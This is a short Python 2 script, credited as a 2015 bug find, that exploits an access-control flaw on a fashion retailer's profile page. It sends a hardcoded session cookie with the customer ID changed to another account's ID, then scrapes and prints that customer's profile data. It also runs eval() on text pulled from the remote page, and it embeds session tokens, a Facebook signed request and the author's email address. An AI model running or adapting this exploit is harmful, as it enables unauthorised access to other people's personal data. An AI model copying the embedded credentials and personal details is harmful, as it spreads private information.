#-----------------------------------------#
#   http://www.fashionandyou.com/profile  #
#   HAIOS PRODUCT @ 2015                  #
#   bug find by Prashant Singh            #
#   script written by Hitesh Kumar Rega   #
#---------------------------------------- #


import urllib
import urllib2
from bs4 import BeautifulSoup
import re


url="http://www.fashionandyou.com/profile"
#6601961 mycid
def getHeader(CID):
        Header={
        "Host": "www.fashionandyou.com",
        "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:42.0) Gecko/20100101 Firefox/42.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "",
        "Cookie": "JSESSIONID=EBF10A27DC11BD9AC1D255EDC894DA11; COOKIE_SUPPORT=true; ngAppTmpl=true; FNY_TOKEN_5=85e23c16d9fbb4a70651e923f3da8f61; __utma=184094513.813766620.1451079143.1451079143.1451079143.1; __utmb=184094513.3.10.1451079143; __utmc=184094513; __utmz=184094513.1451079143.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); __utmt_irwidget=1; pageUrlData=http%3A%2F%2Fwww.fashionandyou.com%2Fprofile; customerFirstRecord=1451079132931; _ga=GA1.2.813766620.1451079143; _gat=1; _gat_UA-59276234-1=1; _vz=viz_567db5e9d6e71; fbsr_311689739016067=PqpfEC42qiv-dYArlF7zSH8uQVG9LWU2LrqcDSCN8Js.eyJhbGdvcml0aG0iOiJITUFDLVNIQTI1NiIsImNvZGUiOiJBUUR2NElOTXQ3QzdLWUROVFA0VHl2dkpwSk5PeE93UWZKcndKWVB6V0NuNzc3NC1rQWdYTXJaeDg2dV9hNHFOZ2JTWV85dHZWcnBRYXVhcVEyN1M5NXFwRldJS0VibFBNS1Y5bmZ6QkFzSG1hM25EM2w5Qk9rZmtoWWxvdmJGaFljNWxMVFVqSk5XWW84M3dCZkdVcWVYRGRKSlpCandqRTdSNUg4TmFtV2doUWlYbFFobnRET0gxMlc1amFTMEx4VXk3LS12cEVoOF80c2l3bVJWeS1aZEFLdnZnTC0yamd5ak1HeXMyTDVPU3hSZDR6QXFtLXlyS21RS2lDdXBTOFZnZnJfZXdQUWNTOWpMc0gwS2hrQWIxZTFtMmFKRHE4Ykg1Q1JkdEhndjRMN2dpUXhhaHo3UUl1eXJNRVNVY18yU0dSM0htdWF5UUFRNmlWSkRKRWQ1TSIsImlzc3VlZF9hdCI6MTQ1MTA3OTE5NiwidXNlcl9pZCI6IjkzOTg1MzY4NjA4OTg5MyJ9; COOKIE_FNY_LOGIN_ID=hiteshnitj16%40gmail.com; _FUI=%7B%22baseDTO%22%3A%7B%22createDate%22%3A%222015-11-27T22%3A15%3A15%2B05%3A30%22%2C%22customerId%22%3A6601961%2C%22firstName%22%3A%22hitesh%22%2C%22gender%22%3A%22M%22%2C%22lastName%22%3A%22kumar%22%2C%22loginId%22%3A%22hiteshnitj16%40gmail.com%22%2C%22loginType%22%3A%22EMAIL%22%2C%22registrationDate%22%3A%222015-11-27T22%3A15%3A15%2B05%3A30%22%2C%22registrationEmailSend%22%3A%22SENT%22%2C%22title%22%3A%22%22%7D%7D; COOKIE_FNY_CUSTOMER_ID="+str(CID),
        "Connection": "keep-alive"
        }
        return Header



class Fashionandyou:
       def __init__(self,url):
              self.url=url

       def getMainData(self,html):
              soup=BeautifulSoup(html)
              tags=soup('script')
              strr=tags[4].get_text()
              strr=strr.strip()
              x=strr.find("var data")
              y=strr.find("};")
              k=strr[x:y+1]
              s=re.findall('{.*}',k)
              d=eval(s[0])
              return d

       def getData(self,CID):
              header=getHeader(CID)
              request=urllib2.Request(url,headers=header)
              contents = urllib2.urlopen(request)
              html=contents.read()
              dicData=self.getMainData(html)
              return dicData



if __name__ ==  "__main__":
        fs=Fashionandyou(url)
        data=fs.getData(6601962)
        print data
